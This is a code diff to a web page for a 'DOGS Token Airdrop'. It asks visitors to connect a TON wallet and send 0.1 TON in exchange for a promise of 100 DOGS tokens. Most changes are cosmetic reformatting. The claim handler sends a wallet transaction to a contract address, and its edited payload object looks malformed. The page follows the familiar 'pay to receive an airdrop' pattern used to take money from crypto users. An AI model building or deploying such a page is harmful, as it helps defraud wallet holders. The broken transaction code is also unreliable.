@@ -23,7 +23,7 @@
             background-color: white;
             padding: 30px;
             border-radius: 15px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
         }
 
         .logo {
@@ -38,8 +38,15 @@
         }
 
         @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
         }
 
         .title {
@@ -121,7 +128,9 @@
         }
 
         @keyframes spin {
-            100% { transform: rotate(360deg); }
+            100% {
+                transform: rotate(360deg);
+            }
         }
     </style>
 </head>
@@ -133,7 +142,7 @@
             <span class="dog-icon">🦮</span>
             <span class="dog-icon">🐕‍🦺</span>
         </div>
-        
+
         <h1 class="title">
             <i class="fas fa-paw"></i>
             DOGS Token Airdrop
@@ -141,7 +150,7 @@
         </h1>
 
         <p class="description">
-            <i class="fas fa-gift"></i> Send 0.1 TON to receive 100 DOGS tokens
+            <i class="fas fa-gift"></i> Send 0.1 TON to receive 100 DOGS tokens1
             <br>
             <small>Join our community of happy DOGS token holders!</small>
         </p>
@@ -158,7 +167,7 @@
         </div>
 
         <div id="ton-connect"></div>
-        
+
         <button id="claim-button" class="button" style="display: none;">
             <i class="fas fa-bone"></i> Claim 100 DOGS
         </button>
@@ -200,40 +209,34 @@
             try {
                 if (!tonConnectUI.connected) {
                     statusDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> Please connect your wallet first';
-                    statusDiv.style.borderLeft = '4px solid #e74c3c';
                     return;
                 }
-
-                loadingDiv.style.display = 'block';
-                claimButton.disabled = true;
 
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 60,
                     messages: [
                         {
                             address: AIRDROP_CONTRACT_ADDRESS,
-                            amount: '100000000', // 0.1 TON
-                            payload: "Claim DOGS airdrop"
+                            amount: '100000000',
+                            payload: {
+                                abi: null,
+                                method: "receive",
+                                params: {}
+                            }
                         }
                     ]
                 };
 
-                statusDiv.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Confirming transaction...';
-                statusDiv.style.borderLeft = '4px solid #f1c40f';
+                console.log('Sending transaction:', transaction);
 
                 const result = await tonConnectUI.sendTransaction(transaction);
                 console.log('Transaction result:', result);
-                
-                statusDiv.innerHTML = '<i class="fas fa-check-circle"></i> Transaction sent! Waiting for confirmation...';
-                statusDiv.style.borderLeft = '4px solid #2ecc71';
+
+                statusDiv.innerHTML = 'Transaction sent! Waiting for confirmation...';
 
             } catch (error) {
                 console.error('Transaction error:', error);
-                statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Error: ${error.message || 'Unknown error occurred'}`;
-                statusDiv.style.borderLeft = '4px solid #e74c3c';
-            } finally {
-                loadingDiv.style.display = 'none';
-                claimButton.disabled = false;
+                statusDiv.innerHTML = 'Error: ' + (error.message || 'Unknown error occurred');
             }
         });
 
